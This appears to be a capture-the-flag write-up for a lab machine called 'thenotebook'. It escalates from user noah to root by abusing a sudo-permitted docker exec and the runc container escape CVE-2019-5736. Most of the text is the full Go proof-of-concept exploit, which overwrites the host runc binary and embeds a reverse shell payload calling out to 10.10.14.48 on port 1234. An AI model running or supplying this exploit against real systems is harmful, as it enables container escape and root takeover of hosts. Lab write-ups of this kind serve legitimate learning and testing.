# Noah user to Root
## Sudo -l command 
`sudo -l` command showed that command `/usr/bin/docker exec -it webapp-dev01*`  can run as root
```bash
noah@thenotebook:/tmp$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```
## Found installed docker version to find relevant exploit
Docker version was 18.06.0-ce.
```bash
noah@thenotebook:/tmp$ docker version                                                                                
Client:                                                                                                              
 Version:           18.06.0-ce                                                                                       
 API version:       1.38                                                                                             
 Go version:        go1.10.3                                                                                         
 Git commit:        0ffa825                                                                                          
 Built:             Wed Jul 18 19:09:54 2018                                                                         
 OS/Arch:           linux/amd64                                                                                      
 Experimental:      false                                             
 ```
 
## Exploit was found corresponding to installed docker version on victim machine
* [Docker escape--runc container escape vulnerability (CVE-2019-5736)](https://programmersought.com/article/71085031667/)
* [github page for exploit code wriiten in golang](https://github.com/Frichetten/CVE-2019-5736-PoC)
* Exploit code is :
```go
package main

// Implementation of CVE-2019-5736
// Created with help from @singe, @_cablethief, and @feexd.
// This commit also helped a ton to understand the vuln
// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
import (
	"fmt"
	"io/ioutil"
	"os"
	"strconv"
	"strings"
)

// This is the line of shell commands that will execute on the host
var payload = "#!/bin/bash \n bash -i >& /dev/tcp/10.10.14.48/1234 0>&1"

func main() {
	// First we overwrite /bin/sh with the /proc/self/exe interpreter path
	fd, err := os.Create("/bin/sh")
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Fprintln(fd, "#!/proc/self/exe")
	err = fd.Close()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("[+] Overwritten /bin/sh successfully")

	// Loop through all processes to find one whose cmdline includes runcinit
	// This will be the process created by runc
	var found int
	for found == 0 {
		pids, err := ioutil.ReadDir("/proc")
		if err != nil {
			fmt.Println(err)
			return
		}
		for _, f := range pids {
			fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
			fstring := string(fbytes)
			if strings.Contains(fstring, "runc") {
				fmt.Println("[+] Found the PID:", f.Name())
				found, err = strconv.Atoi(f.Name())
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}
	}

	// We will use the pid to get a file handle for runc on the host.
	var handleFd = -1
	for handleFd == -1 {
		// Note, you do not need to use the O_PATH flag for the exploit to work.
		handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
		if int(handle.Fd()) > 0 {
			handleFd = int(handle.Fd())
		}
	}
	fmt.Println("[+] Successfully got the file handle")

	// Now that we have the file handle, lets write to the runc binary and overwrite it
	// It will maintain it's executable flag
	for {
		writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
		if int(writeHandle.Fd()) > 0 {
			fmt.Println("[+] Successfully got write handle", writeHandle)
			writeHandle.Write([]byte(payload))
			return
		}
	}
}
```
## Downloaded , edited and transferred exploit to victim docker container
![[Pasted image 20210407091837.png]]
## Ran exploit and got shell as root and got root flag
![[Pasted image 20210407100629.png]]